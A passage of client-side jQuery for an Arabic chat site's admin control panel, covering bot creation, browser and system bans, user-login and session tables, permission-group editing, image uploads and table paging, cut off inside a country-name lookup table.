function addbot(){
    const nameb = $('#nameb').val() || '';
    const rankbot = $('#rankbot').val() || '';
    const countrybot = $('#countrybot').val() || '';
    const statsbots = $('#statsbots').val() || 0;
    const urlpic = $('.spicbot').attr("src") || 'pic.png';
    const rommbot = $('#rommbot').val() || '';
    const msgbot = $('#msgbot').val() || '';
    if(nameb.trim() && rommbot && countrybot){
    const isbot = {
    nameb:nameb,
    rankbot:rankbot,
    statsbots:statsbots,
    countrybot:countrybot,
    urlpic:urlpic,
    rommbot:rommbot,
    msgbot:msgbot,
    }
          $.get('cp.nd?db='+JSON.stringify(isbot)+'&cmd=addbots&token='+token,function(d){
                        var data = JSON.parse(d)
                        if(data.err == true ){
                        alert(data.msg);
                        }else{
                        alert(data.msg);
                        bots();
                        };
                    });
                    }else{
                    alert('الرجاء التحقق من البيانات')
                    };
    };
    function remDefUser(d){
        var it = confirm('هل انت متاكد من رغبتك في حذف العضويات التي لم تسجل دخولها للموقع خلال '+d+' يوم الماضية')
        if(it){
            $.get('cp.nd?d='+d+'&cmd=delloginDay&token='+token,function(d){
                var data = JSON.parse(d)
                if(data.err == true ){
                alert(data.msg);
                }else{
                alert(data.msg);
                logins();
                };
            });
        }
    }
    
    var browsers = {}
    var browser = $('#browser').is(":checked");
    $('#browser9').click(function(){
        if($(this).is(":checked"))$('#browser input.fa').prop('checked',false);
        else $('#browser1, #browser2').prop('checked',true);
    });
    $('#browser input.fa').click(function(){
        var ech = false;
        $('#browser input.fa').each(function(e,x){
            if($(x).is(":checked"))ech = true
        })
        $('#browser9').prop('checked',ech?false:true);
    });
    function getBrowsers(){
        $('#browser input').each(function(e,x){
            var idThis = $(this).attr('id');
            browsers[idThis] = $(this).is(":checked")
        });
        return browsers;
    }
    $('#btnbrowser').click(function(){
        var idBrowser = $('#browser').attr('name')
        $.get('cp.nd?type='+ encodeURI(JSON.stringify(getBrowsers()))+'&cmd=ban&token='+token,function(data){
            var e=JSON.parse(data);
            if(e){
                if(idBrowser)unban(idBrowser);
                bans();
            }
            //																					console.log(idBrowser)
        })
    })
    
    var systems = {}
    var system = $('#system').is(":checked");
    $('#system7').click(function(){
        if($(this).is(":checked"))$('#system input.fa').prop('checked',false);
        else $('#system1, #system2').prop('checked',true);
    });
    $('#system input.fa').click(function(){
        var ech = false;
        $('#system input.fa').each(function(e,x){
            if($(x).is(":checked"))ech = true
        })
        $('#system7').prop('checked',ech?false:true);
    });
    function getSystems(){
        $('#system input').each(function(e,x){
            var idThis = $(this).attr('id');
            systems[idThis] = $(this).is(":checked")
        });
        return systems;
    }
    $('#btnSystem').click(function(){
        var idStstem = $('#system').attr('name');
        $.get('cp.nd?type='+ encodeURI(JSON.stringify(getSystems()))+'&cmd=ban&token='+token,function(data){
            var e=JSON.parse(data);
            if(e){
                if(idStstem)unban(idStstem);
                bans();
            }
        })
    })


    var lpop = '',
						powersarr = [],
						loginsarr = [];
		var roomslist = [];

		/*var token = getUrlParameter('token');
		function getUrlParameter(sParam){
			var sPageURL = window.location.search.substring(1);
			var sURLVariables = sPageURL.split('');
			for (var i = 0; i < sURLVariables.length; i++){
				var sParameterName = sURLVariables[i].split('=');
				if (sParameterName[0] == sParam){
					return sParameterName[1];
				}
			}
		}*/
		var token = window.location.pathname.slice(10);
		
			function SatrtCP(e){
			$.get('cp.nd?cmd=IsStart&token='+token,function(d){
				var jq = JSON.parse(d);
				if(jq.msg){
				$('#host').css('display','block');
				$('#botp').css('display','block');
				}else{
				$('#host').css('display','none');				
				$('#botp').css('display','none');				
				};
			});
			
				$.get('cp.nd?cmd=IsStarta&token='+token,function(d){
				var jq = JSON.parse(d);
				if(jq.msg){
				$('#siteweb').css('display','block');
				}else{
				$('#siteweb').css('display','none');				
				};
			});		
			
			$.get('cp.nd?cmd=IsStartap&token='+token,function(d){
				var jq = JSON.parse(d);
				if(jq.msg){
				$('#sitepow').css('display','block');
				}else{
				$('#sitepow').css('display','none');				
				};
			});
		}
		
		SatrtCP();
		
		function createTable(headers){
			var h=$('<table class="tablesorter"></table>');
			h.append('<thead><tr></tr></thead>');
			h.append('<tbody></tbody>');
			$.each(headers,function(i,e){
				h.find('thead').find('tr').append("<th class=' border corner'  >"+e+"</th>");
			});
			h.tablesorter();

			return h;
		} 
		function tableAdd(table,values,id,vsf){
			var t=$(table);
			var tr=$('<tr id="'+(id||``)+'"></tr>');
			$.each(values,function(i,e){
				if(i==values.length-1){

					tr.append("<td>"+(e+'') +"</td>");
					vsf?tr.append("<td>"+(vsf+'') +"</td>"):'';
				}else{
					tr.append("<td>"+(e+'').split("<").join("&#x3C;")+"</td>");
				}
			})
			t.find('tbody').not('.rrrr').append(tr);

		}		
		
		function tableAddhtm(table,values,id,vsf){
			var t=$(table);
			var tr=$('<tr id="'+(id||``)+'"></tr>');
			$.each(values,function(i,e){
				if(i==values.length-1){

					tr.append("<td>"+(e+'') +"</td>");
					vsf?tr.append("<td>"+(vsf+'') +"</td>"):'';
				}else{
					tr.append("<td>"+(e+'')+"</td>");
				}
			})
			t.find('tbody').not('.rrrr').append(tr);

		}
		Number.prototype.time=function(){
			var t=this; 
			var d=0;
			var h=0;
			var m=0;
			var s=0;
			var ret='' 
			d= parseInt(t/(1000*60*60*24));
			t=t-parseInt((1000*60*60*24)*d);
			h= parseInt(t/(1000*60*60));
			t=t-parseInt((1000*60*60)*h);
			m= parseInt(t/(1000*60)); 
			t=t-parseInt((1000*60)*m);
			s=parseInt(t/1000);
			if(d>9){ret += d+':';}else{ret+='0'+d+':';}
			if(h>9){ret += h+':';}else{ret+='0'+h+':';}
			if(m>9){ret += m+':';}else{ret+='0'+m+':';} 
			if(s>9){ret += s;}else{ret+='0'+s;} 
			return ret; 
		}
		if (!Array.prototype.findone) {
			Array.prototype.findone = function(fun/*, thisArg*/) {
				'use strict';

				if (this === void 0 || this === null) {
					throw new TypeError();
				}
				var funn=fun;
				var t = Object(this);
				var len = t.length >>> 0;
				if (typeof fun !== 'function') {
					funn=function(i,e){
						var k=   Object.keys(fun);
						var isok=0;
						k.forEach(function(ee,ii){
							if(funn[ee]==e[ee]){isok+=1;}
						}); return isok==k.length;
					} 
				}
				var thisArg = arguments.length >= 2 ? arguments[1] : void 0;
				for (var i = 0; i < len; i++) {
					if (i in t) {
						var val = t[i];
						if (funn.call(thisArg, val, i, t))return val ;
					}
				}
				return null;
			};
		}
		(function ($) {
			$.fn.popTitle = function (html) {
				var popclose = this.parent().parent().find('.phide').detach();
				this.parent().parent().find('.pophead').html(html).prepend(popclose);
				return this;
			}
			$.fn.pop = function (options) { 
				// This is the easiest way to have default options.

				if (this.hasClass('pop')) { ; return this.find('.popbody').children(0).pop(options) }

				switch (options) {
					case 'show':
						if (this.parent().hasClass('popbody') == false) { this.pop(); }
						$('.pop').css('z-index', 2000);
						this.parent().parent().css('z-index', 2001)
						this.parent().parent().css('display', '');
						$(window).trigger('resize');

						return this;
						break;
					case 'hide':
						this.parent().parent().css('display', 'none');
						return this;
						break;
						return this;
					case 'remove':
						this.parent().parent().remove();
						return this;
						break;
				}
				var settings = $.extend({
					// These are the defaults.
					width: '50%', height: '50%', top: '5px', left: '5px',
					title: "",
					close: 'hide',
					bg: $(document.body).css('background-color')
				}, options);

				var popup = $('<div class="pop corner" style="border:1px solid lightgrey;display:none;max-width:95%;position:absolute;z-index:2000;top:' + settings.top + ';left:' + settings.left + '"></div>')
				.css({ "background-color": settings.bg, "width": settings.width, "height": settings.height });
				var pophead = $('<div class="pophead dots corner bg-primary" style="padding:2px;width:100%!important;"></div>').first();
				var popbody = $('<div style="margin-top:-5px;" class="popbody"></div>');
				var oldpar = this.parent();
				popbody.append(this);
				pophead.html(settings.title);
				pophead.prepend('<span onclick="$(this).pop(\'' + settings.close + '\')" class="phide pull-right clickable border label label-danger"><i class="fa fa-times"></i></span>')
				popup.on('resize', function () { popbody.css('height', popup.height() - pophead.outerHeight(true) + 'px'); });
				popup.append(pophead);
				popup.append(popbody);

				if (oldpar.length == 0) {
					$(document.body).append(popup);
				}
				else {
					oldpar.append(popup);
				}
				// Greenify the collection based on the settings variable.
				return this;
			};}( jQuery ));
		function loginpop(id,rep,docu,lGe,lGee){
			var lg=loginsarr.findone(function(e){return e.idreg==id;})
			if(lg!=null){
				if(lpop==''){lpop=$('#lpop').html();$('#lpop').remove();}
				var ht=$(lpop) ;
				$('.isnametopoc').html(lg.topic);
				ht.find('.del').off().click(function(){
					$.get('cp.nd?id='+id+'&cmd=dellogin&token='+token,function(d){
						var data = JSON.parse(d)
							alert(data.msg);
							logins();
					});
				});
				ht.find('.usersetpower').off().click(function(){
					set_power(lg.idreg,ht.find('.powerbox').val(),ht.find('.powerdays').val());
				});
				ht.find('.powerbox option[value="'+lg.power+'"]').prop('selected',true);
				ht.find('.userlikes').val(rep);
				ht.find('.usersetlikes').off().click(function(){
					$.get('cp.nd?id='+id+'&cmd=likes&token='+token + '&rep='+ht.find('.userlikes').val(),function(d){
						var data = JSON.parse(d) 
						alert(data.msg)
					});
				});
				if(docu){
					ht.find('.documentationc').attr('checked',true);
					ht.find('span.s1').html('عضوية موثقة<input class="documentationc" type="checkbox" checked>').css('color','green');
				}
				if(lGe != false){
					ht.find('.loginG').attr('checked',true);
					ht.find('span.s2').css('color','green');
				}
				if(lGee != false){
					ht.find('.loginGG').attr('checked',true);
					ht.find('span.s3').css('color','green');
				}
				if(lGee != false){
					ht.find('.loginGG3').attr('checked',false);
					ht.find('span.f0').css('color','green');
				}
				ht.find('.usersetpwd').off().click(function(){
					$.get('cp.nd?id='+id+'&cmd=pwd&token='+token + '&pwd='+ht.find('.userpwd').val(),
											function(d){
						var data = JSON.parse(d) 
						alert(data.msg)
					});
				});
				ht.find('.documentation').off().click(function(){
                var aaaa = 'cp.nd?id='+id+'&cmd=documentation&token='+token +'&documentation='+JSON.stringify({
                documentation:ht.find('.documentationc').is(":checked")
               ,loginG:ht.find('.loginG').is(":checked")
			   ,loginGG:ht.find('.loginGG').is(":checked")
			   ,loginGG3:ht.find('.loginGG3').is(":checked")


                 });

                 $.get(aaaa,
              function(d){
              var data = JSON.parse(d) 
               alert(data.msg)
                });
            });
				ht.pop({left:'20%',width:'340px',height:'80%',close:'remove',title:lg.t} ).pop('show');
			}
		}
		function powerchange(){
			var k=$('.selbox').val();
			var power=null;
			for(var i=0;i<powersarr.length;i++){
				if(powersarr[i].name==k){
					power=powersarr[i];
					break;
				}
			}
			if(power!=null){
				var names=
								[
									['rank','الترتيب'],
									['name','إسم المجموعه'],
									['ico','الإيقونه'],
									['kick','الطرد'],
									['delbc','حذف الحائط'],
									['alert','التنبيهات'],
									['mynick','تغير النك'],
									['unick','تغير النكات'],
									['ban','الباند'],
									['publicmsg','الإعلانات'],
									['forcepm','فتح الخاص'],
									['loveu','نقل من الغرفة'], 
									['roomowner','إداره الغرف'],
									['createroom','انشاء الغرف'],
									['rooms','اقصى حد للغرف الثابته'],
									['edituser','إداره العضويات'],
									['meiut','إسكات العضو'], 
									['ulike','تعديل لايكات العضو'],
									['flter','الفلتر'], 
									['subs','الاشتراكات'],
									['shrt','الاختصارات'], 
									['msgs','رسائل الدردشة'],
                                    ['bootedit','فلتر المراقبة'],
									['setpower','تعديل الصلاحيات'],
									['bnrpower',' البنرات'],  
									['upgrades','الهدايا'],
									['history','كشف النكات'],
									['editprofile','تصميم العضوية'],
									['cp','لوحه التحكم'],
									['grupess','الغرف الممتلئة و المغلقة'],
									['grupes',' بوت المسابقات'],
									['delpic','حذف صورة العضو'],
									['delmsg','حذف الرسائل العامة'],
									['stealth','مخفي'],
									['owner','إداره الموقع'],
								];
				var ht=$("<div class='json' style='width:260px;'></div>");
				ht.append(jsonhtml(power,names,powers_save))
				$('#powers .json').remove();
				$('#powers').append(ht);  
				$('#powers .delp').off().click(function(){powers_delete(power);});
			}
		}
		function jsonhtml(j,names,onsave){
			j = {
				"rank":j.rank,
				"name":j.name,
				"ico":j.ico,
				"kick":j.kick,
				"publicmsg":j.publicmsg,
				"rooms":j.rooms,
				"upgrades":j.upgrades,
				"delbc":Boolean(j.delbc),
				"alert":Boolean(j.alert),
				"mynick":Boolean(j.mynick),
				"unick":Boolean(j.unick),
				"ban":Boolean(j.ban),
				"forcepm":Boolean(j.forcepm),
				"roomowner":Boolean(j.roomowner),
				"createroom":Boolean(j.createroom),
				"edituser":Boolean(j.edituser),
				"setpower":Boolean(j.setpower),
				"bnrpower":Boolean(j.bnrpower),
				"history":Boolean(j.history),
				"cp":Boolean(j.cp),
				"stealth":Boolean(j.stealth),
				"owner":Boolean(j.owner),
				"msgs":Boolean(j.msgs),
                "bootedit":Boolean(j.bootedit),
				"shrt":Boolean(j.shrt),
				"subs":Boolean(j.subs),
				"flter":Boolean(j.flter),
				"ulike":Boolean(j.ulike),
				"grupes":Boolean(j.grupes),
				"grupess":Boolean(j.grupess),
				"editprofile":Boolean(j.editprofile),
				"delmsg":Boolean(j.delmsg),
				"delpic":Boolean(j.delpic),
				"meiut":Boolean(j.meiut),
				"loveu":Boolean(j.loveu)
			}

			var html=$('<div style="width:100%;height:100%;padding:5px;" class="break"></div>');
			var okeys=Object.keys(j);
			$.each(okeys,function(i,key){
				//         
				var name=null; 
				if (names!=null){$.each(names,function(i,e){

					if(e[0]==key){name=e[1]}else 
						okeys.splice(okeys.indexOf(e[0]),1);okeys.splice(i,0,e[0]);
				})}
				if(name==null){return;}
				switch ( typeof j[key]){
					case "string":
						html.append('<label class="label label-primary">'+name+'</label>')
						html.append('<input type="text" name="'+key+'" class="corner" value="'+j[key]+'"></br>')
						break;
					case "boolean":
						html.append('<label class="label label-primary">'+name+'</label>');
						var checked=''; if (j[key]){checked='checked'}
						html.append('<label>تفعيل<input name="'+key+'" type="checkbox" class="corner" '+checked+'></label></br>')
						break;
					case "number":
						html.append('<label class="label label-primary">'+name+'</label>')
						html.append('<input name="'+key+'" type="number" style="width:60px;" class="corner" value="'+j[key]+'"></br>')
						break;
				}
			});  
			html.append('<button class="btn btn-primary fr fa fa-edit" style=" width: 60px; background: #29b12f; border-color: #5cb85c!important; ">حفظ</button>');
			html.find('button').click(function(){onsave(htmljson(html))});
			return html;
		}
		function htmljson(html){
			html=$(html);
			var json={};
			$.each(html.find('input'),function(i,e){
				switch ($(e).attr('type')){
					case "text":
						json[$(e).attr('name')]=$(e).val();
						break;
					case "checkbox":
						json[$(e).attr('name')]=$(e).prop('checked');
						break;
					case "number":
						json[$(e).attr('name')]= parseInt( $(e).val(),10);
						break;
				}
			});
			return json;
		}
		
 function sendpic() {
    var e = $("<input  accept='image/*' type='file' style='display:none;'/>").first();

    e.trigger('click');


    var xx;

    $(e).on('change', function() {

        $('.spicbot').attr('src', '/imgs/ajax-loader.gif');
		 var formData = new FormData();
        formData.append('photo', $(e).prop('files')[0]);
        xx = $.ajax({
            xhr: function() {
                var xhr = new window.XMLHttpRequest();
                //Upload progress
                xhr.upload.addEventListener("progress", function(evt) {
                    if (evt.lengthComputable) {
                        var percentComplete = evt.loaded / evt.total;
                        //Do something with upload progress
                        // $(e).children('p').html( + "%");

                    }
                }, false);

                return xhr;
            },
            timeout: 0,
            url: '/pic?secid=u&fn=' + $(e).val().split('.').pop(),
            type: 'POST',
            data: formData,
			datatype: "json",
            cache: false,
            processData: false,
            contentType: false,
            success: function(data) {
                $('.spicbot').attr('src', data);
            },
            error: function() { $('.spicbot').attr('src', '');
                alert('فشل إرسال الصوره تأكد ان حجم الصوره مناسب'); }
        });





    });
}

		function sendfile(id,onsend) {
			var e = $("<input  accept='image/*' type='file' style='display:none;'/>").first();
			e.trigger('click');
			var xx;
			$(e).on('change', function () {
				var sp = $("<div class='mm msg ' style='width:200px;'><a class='fn '></a><button style='color:red;border:1px solid red;min-width:40px;' class=' cancl'>X</button></div>")
				sp.insertAfter($(id));  
				$(sp).find(".cancl").click(function () { $(sp).remove(); xx.abort(); });
				var ty = $(e).prop('files')[0].type.split('/')[0]

				var formData = new FormData();
				formData.append('photo',  $(e).prop('files')[0])
				xx = $.ajax({
					xhr: function () {
						var xhr = new window.XMLHttpRequest();
						xhr.upload.addEventListener("progress", function (evt) {
							if (evt.lengthComputable) { 
								var percentComplete = evt.loaded / evt.total;
								//            $(sp.find(".fn")).text("%" + parseInt(percentComplete * 100) + " | " + $(e).children('input').val().split("\\").pop());
							}
						}, false);
						return xhr;
					},
					timeout: 0,
					url: 'pic?cmd=roomsPic&f=pic&t='+ty+'&token='+token,
					//      url: 'pic?secid=room&fo=pic',
					type: 'POST',
					data:formData ,
					cache: false,
					processData: false,
					contentType: false,
					success: function (data) {
						pickedfile = data;  
						onsend(data);  
						$(e).remove();
						$(sp).remove();
					},
					error: function () {
						$(sp).remove();
					}
				}); 
			});
		}
		function sendfilea(id, onsend,folder){
			pickedfile = null;
			var e = $("<div></div>").first();
			e.append("<input type='file'  accept='image/*' style='display:none;'/>");
			e.children('input').trigger('click');

			var xx;
			$(e).children('input').on('change', function () {
				var sp = $("<div class='mm msg ' style='width:200px;'><a class='fn '></a><button style='color:red;border:1px solid red;min-width:40px;' class=' cancl'>X</button></div>")
				sp.insertAfter($(id)); 
				$(sp).find(".cancl").click(function () { $(sp).remove(); xx.abort(); });
				var formData = new FormData();
				var ty = $(e).children('input').prop('files')[0].type.split('/')[0];

				formData.append('photo', $(e).children('input').prop('files')[0]);
				xx = $.ajax({
					xhr: function () {
						var xhr = new window.XMLHttpRequest();
						xhr.upload.addEventListener("progress", function (evt) {
							if (evt.lengthComputable) {
								var percentComplete = evt.loaded / evt.total;
								$(sp.find(".fn")).text("%" + parseInt(percentComplete * 100) + " | " + $(e).children('input').val().split("\\").pop());
							}
						}, false);

						return xhr;
					},
					timeout: 0,

					url: '/upload?cmd=upload&f=up&t='+ty+'&token='+token+'&state='+folder,
					//        url: 'upload?fo='+folder,
					type: 'POST',
					data:formData,
					cache: false,
					processData: false,
					contentType: false,
					success: function (data) {
						var d = JSON.parse(data)
						if(d){
							if(d.error){
								$(sp).remove();
								alert(d.msg)
							}else{
								pickedfile = d.msg;  
								onsend(d.msg,folder); 
								$(e).remove();
								$(sp).remove();
							}
						}

					},
					error: function () { $(sp).remove(); }
				});
			});
		}



		function start(){
			$(window).on('resize',function(){
				$.each($('.pop'),function(i,e){
					$(e).find('.popbody').css('height',$(e).height()-$(e).find('.pophead').height()+'px');
				});
			});
		}
		
		
	     function isflag(data){
		     return "<img src='/flag/"+data.toLowerCase().replace('il','ps')+".png' style='width: 30px;margin: 5px;border: 1px solid darkgray;'> "+data+" ";
		 };
	function fps(){
			var url = 'cp.nd?cmd=fps&token='+token+'&q='+encodeURIComponent($('#fpsearch').val())
			$.get(url,function(d){
				var data= JSON.parse(d);
				if(data.err === true){
					$('#fps').text('لا تملك صلاحيات');return;
				}
				 if(d.r=='*'){d.r='';} 
				if(d.isin=='*'){d.isin='';}
				$('#fps .tablesorter').remove();
				var h=createTable("الحاله,العضو,الزخرفه,الآي بي,الدوله,الجهاز,المصدر,الدعوه,الوقت,التوثيق".split(','));
				var d=data[data.length-1];
				 data.splice(data.length-1,1);  
				d= new Date().getTime() ;
				$('#fps').append(h);
				$.each(data,function(i,e){
					var btn= !e.state.includes('زائر') ? "<a class='btn btn-success fa fa-check' onclick='checkuser(\""+e.username+"\")'></a>" : "" ;
					tableAddhtm(h,[e.state,e.topic,e.username,e.ip,isflag(e.code),e.device,e.isin ||'',e.isin||'',(new Date(d - e.time ).getTime() ).time(),btn]);
				});
				$('#fps .tablesorter').trigger("update").find('th').last().trigger('click') ;
				 readyfps() 
				$(".tablesorter").each(function(ii,tp){
					$(tp).find('tr').each(function(i,e){
						if(i/2==Math.ceil(i/2)){
							$(e).css('background-color','#fffafa');
						}else{
							$(e).css('background-color','#fafaff');
						}
					});
				});
			});
		}
		

		function actions(){
			$.get('cp.nd?cmd=actions&token='+token,function(d){
				var data=JSON.parse(d);
				if(data.err === true){
					$('#actions').text('لا تملك صلاحيات');return;
				}
				$('#actions .tablesorter').remove();
				var h=createTable(['الحاله','العضو','العضو الثاني','الغرفه','الاي بي','الوقت']);
				var d=data[data.length-1];
				 data.splice(data.length-1,1);   
				d = new Date().getTime() ;
				$('#actions').append(h);
				$.each(data,function(i,e){
					tableAdd(h,[e.state,e.topic,e.username,e.room,e.ip,(new Date(d - e.time ).getTime() ).time()]);
				});
				$('#actions .tablesorter').trigger("update").find('th').last().trigger('click');
								 readyaction()

				$(".tablesorter").each(function(ii,tp){
					$(tp).find('tr').each(function(i,e){
						if(i/2==Math.ceil(i/2)){
							$(e).css('background-color','#fffafa');
						}else{
							$(e).css('background-color','#fafaff');
						}

					});
				});
			});
		}

		function checkuser(data){
		if(data){
			                $.get('cp.nd?cmd=chkeduser&id='+data+'&token='+token,function(d){
							     	if(data.err === true){
					alert('لا تملك صلاحيات');return;
				}else{
								alert('تم توثيق العضو');;
				};
							});
			};
		};
	function readyaction(){
        var pageSize = 50;
        $(".hdnActivePages").val(1);
        var numberOfPages = $('#actions .tablesorter tbody tr').length / pageSize;
        numberOfPages = numberOfPages.toFixed();
        $(".nextpages").on('click', function () {
            $("#actions .tablesorter tbody tr:nth-child(-n+" + (($(".hdnActivePages").val() * pageSize) + pageSize) + ")").show();
            $("#actions .tablesorter tbody tr:nth-child(-n+" + $(".hdnActivePages").val() * pageSize + ")").hide();
            var currentPage = Number($(".hdnActivePages").val());
            $(".hdnActivePages").val(Number($(".hdnActivePages").val()) + 1);
            if ($(".hdnActivePages").val() != "1") {
                $(".prevpages").show();
            }
            if ($(".hdnActivePages").val() == numberOfPages) {
                $(".nextpages").hide();
            }
        });

        $(".prevpages").on('click', function () {
            var currentPage = Number($(".hdnActivePages").val());
            $(".hdnActivePages").val(currentPage - 1);
            $("#actions .tablesorter tbody tr").hide();
            $("#actions .tablesorter tbody tr:nth-child(-n+" + ($(".hdnActivePages").val() * pageSize) + ")").show();
            $("#actions .tablesorter tbody tr:nth-child(-n+" + (($(".hdnActivePages").val() * pageSize) - pageSize) + ")").hide();
            if ($(".hdnActivePages").val() == "1") {
                $(".prevpages").hide();
            } 
            if ($(".hdnActivePages").val() < numberOfPages) {
                $(".nextpages").show();
            } 
        });
  };   
  readyaction();
  
  
  function readylogins(){
        var pageSize = 50;
        $(".hdnActivePagesu").val(1);
        var numberOfPages = $('#logins .tablesorter tbody tr').length / pageSize;
        numberOfPages = numberOfPages.toFixed();
        $(".nextpagesu").on('click', function () {
            $("#logins .tablesorter tbody tr:nth-child(-n+" + (($(".hdnActivePagesu").val() * pageSize) + pageSize) + ")").show();
            $("#logins .tablesorter tbody tr:nth-child(-n+" + $(".hdnActivePagesu").val() * pageSize + ")").hide();
            var currentPage = Number($(".hdnActivePagesu").val());
            $(".hdnActivePagesu").val(Number($(".hdnActivePagesu").val()) + 1);
            if ($(".hdnActivePagesu").val() != "1") {
                $(".prevpagesu").show();
            }
            if ($(".hdnActivePagesu").val() == numberOfPages) {
                $(".nextpagesu").hide();
            }
        });

        $(".prevpagesu").on('click', function () {
            var currentPage = Number($(".hdnActivePagesu").val());
            $(".hdnActivePagesu").val(currentPage - 1);
            $("#logins .tablesorter tbody tr").hide();
            $("#logins .tablesorter tbody tr:nth-child(-n+" + ($(".hdnActivePagesu").val() * pageSize) + ")").show();
            $("#logins .tablesorter tbody tr:nth-child(-n+" + (($(".hdnActivePagesu").val() * pageSize) - pageSize) + ")").hide();
            if ($(".hdnActivePagesu").val() == "1") {
                $(".prevpagesu").hide();
            } 
            if ($(".hdnActivePagesu").val() < numberOfPages) {
                $(".nextpagesu").show();
            } 
        });
  };   
		
		readylogins();
	function readyfps(){
        var pageSize = 50;
        $(".hdnActivePage").val(1);
        var numberOfPages = $('#fps .tablesorter tbody tr').length / pageSize;
        numberOfPages = numberOfPages.toFixed();
        $(".nextpage").on('click', function () {
            $("#fps .tablesorter tbody tr:nth-child(-n+" + (($(".hdnActivePage").val() * pageSize) + pageSize) + ")").show();
            $("#fps .tablesorter tbody tr:nth-child(-n+" + $(".hdnActivePage").val() * pageSize + ")").hide();
            var currentPage = Number($(".hdnActivePage").val());
            $(".hdnActivePage").val(Number($(".hdnActivePage").val()) + 1);
            if ($(".hdnActivePage").val() != "1") {
                $(".prevpage").show();
            }
            if ($(".hdnActivePage").val() == numberOfPages) {
                $(".nextpage").hide();
            }
        });

        $(".prevpage").on('click', function () {
            var currentPage = Number($(".hdnActivePage").val());
            $(".hdnActivePage").val(currentPage - 1);
            $("#fps .tablesorter tbody tr").hide();
            $("#fps .tablesorter tbody tr:nth-child(-n+" + ($(".hdnActivePage").val() * pageSize) + ")").show();
            $("#fps .tablesorter tbody tr:nth-child(-n+" + (($(".hdnActivePage").val() * pageSize) - pageSize) + ")").hide();
            if ($(".hdnActivePage").val() == "1") {
                $(".prevpage").hide();
            } 
            if ($(".hdnActivePage").val() < numberOfPages) {
                $(".nextpage").show();
            } 
        });
  };   
		
		readyfps()



		function logins(){
			if(powersarr.length==0){powers();}
			var val = encodeURIComponent($('#loginsearch').val());
			var urlg = 'cp.nd?cmd=logins&token='+token+'&q='+val;
			$.get(urlg,function(d){
				var data=JSON.parse(d);
				if(data.err === true){
					$('#logins').text('لا تملك صلاحيات');return;
				}
				loginsarr=data;
				$('#logins .tablesorter').remove();
				var h=createTable(['العضو','الزخرفه','الآي بي','الجهاز','صلاحيات','آخر تواجد','التسجيل','']);
			    var d=data[data.length-1];
				d = new Date().getTime() ;
				$('#logins').append(h);
				$.each(data,function(i,e){
				if(e.power != 'Hide' && e.power != 'chatmaster'){
					var btn="<a class='btn btn-primary fa fa-gear' onclick='loginpop(\""+e.idreg+"\","+e.rep+","+e.documentationc+","+e.loginG+","+e.loginGG+","+e.loginGG3+");'></a>";
					tableAdd(h,[e.username,e.topic,e.ip,e.fp,e.power,(new Date(d - e.lastssen ).getTime() ).time(),(new Date(d - e.joinuser ).getTime() ).time(),btn]); 
}					

				});
				$('#logins .tablesorter').trigger("update") ;
				 readylogins();
				$(".tablesorter").each(function(ii,tp){
					$(tp).find('tr').each(function(i,e){
						if(i/2==Math.ceil(i/2)){
							$(e).css('background-color','#fffafa');
						}else{
							$(e).css('background-color','#fafaff');
						}
					});
				});
			});
		}
		
		var ufc = { "kw": "الكويت", "et": "إثيوبيا", "az": "أذربيجان", "am": "أرمينيا", "aw": "أروبا", "er": "إريتريا", "es": "أسبانيا", "au": "أستراليا", "ee": "إستونيا", "il": "فلسطين", "af": "أفغانستان", "ec": "إكوادور", "ar": "الأرجنتين", "jo": "الأردن", "ae": "الإمارات العربية المتحدة", "al": "ألبانيا", "bh": "مملكة البحرين", "br": "البرازيل", "pt": "البرتغال", "ba": "البوسنة والهرسك", "ga": "الجابون", "dz": "الجزائر", "dk": "الدانمارك", "cv": "الرأس الأخضر", "ps": "فلسطين", "sv": "السلفادور", "sn": "السنغال", "sd": "السودان", "se": "السويد", "so": "الصومال", "cn": "الصين", "iq": "العراق", "ph": "الفلبين", "cm": "الكاميرون", "cg": "الكونغو", "cd": "جمهورية الكونغو الديمقراطية", "de": "ألمانيا", "hu": "المجر", "ma": "المغرب", "mx": "المكسيك", "sa": "المملكة العربية السعودية", "uk": "المملكة المتحدة", "gb": "المملكة المتحدة", "no": "النرويج", "at": "النمسا", "ne": "النيجر", "in": "الهند", "us": "الولايات المتحدة", "jp": "اليابان", "ye": "اليمن", "gr": "اليونان", "ag": "أنتيغوا وبربودا", "id": "إندونيسيا", "ao": "أنغولا", "ai": "أنغويلا", "uy": "أوروجواي", "uz": "أوزبكستان", "ug": "أوغندا", "ua": "أوكرانيا", "ir": "إيران", "ie": "أيرلندا", "is": "أيسلندا", "it": "إيطاليا", "pg": "بابوا-غينيا الجديدة", "py": "باراجواي", "bb": "باربادوس", "pk": "باكستان", "pw": "بالاو", "bm": "برمودا", "bn": "بروناي", "be": "بلجيكا", "bg": "بلغاريا", "bd": "بنجلاديش", "pa": "بنما", "bj": "بنين", "bt": "بوتان", "bw": "بوتسوانا", "pr": "بورتو ريكو", "bf": "بوركينا فاسو", "bi": "بوروندي", "pl": "بولندا", "bo": "بوليفيا", "pf": "بولينزيا الفرنسية", "pe": "بيرو", "by": "بيلاروس", "bz": "بيليز", "th": "تايلاند", "tw": "تايوان", "tm": "تركمانستان", "tr": "تركيا", "tt": "ترينيداد وتوباجو", "td": "تشاد", "cl": "تشيلي", "tz": "تنزانيا", "tg": "توجو", "tv": "توفالو", "tk": "توكيلاو", "to": "تونجا", "tn": "تونس", "tp": "تيمور الشرقية", "jm": "جامايكا", "gm": "جامبيا", "gl": "جرينلاند", "pn": "جزر البتكارين", "bs": "جزر البهاما", "km": "جزر القمر", "cf": "أفريقيا الوسطى", "cz": "جمهورية التشيك", "do": "جمهورية الدومينيكان", "za": "جنوب أفريقيا", "gt": "جواتيمالا", "gp": "جواديلوب", "gu": "جوام", "ge": "جورجيا", "gs": "جورجيا الجنوبية", "gy": "جيانا", "gf": "جيانا الفرنسية", "dj": "جيبوتي", "je": "جيرسي", "gg": "جيرنزي", "va": "دولة الفاتيكان", "dm": "دومينيكا", "rw": "رواندا", "ru": "روسيا", "ro": "رومانيا", "re": "ريونيون", "zm": "زامبيا", "zw": "زيمبابوي", "ws": "ساموا", "sm": "سان مارينو", "sk": "سلوفاكيا", "si": "سلوفينيا", "sg": "سنغافورة", "sz": "سوازيلاند", "sy": "سوريا", "sr": "سورينام", "ch": "سويسرا", "sl": "سيراليون", "lk": "سيريلانكا", "sc": "سيشل", "rs": "صربيا", "tj": "طاجيكستان", "om": "عمان", "gh": "غانا", "gd": "غرينادا", "gn": "غينيا", "gq": "غينيا الاستوائية", "gw": "غينيا بيساو", "vu": "فانواتو", "fr": "فرنسا", "ve": "فنزويلا", "fi": "فنلندا", "vn": "فيتنام", "cy": 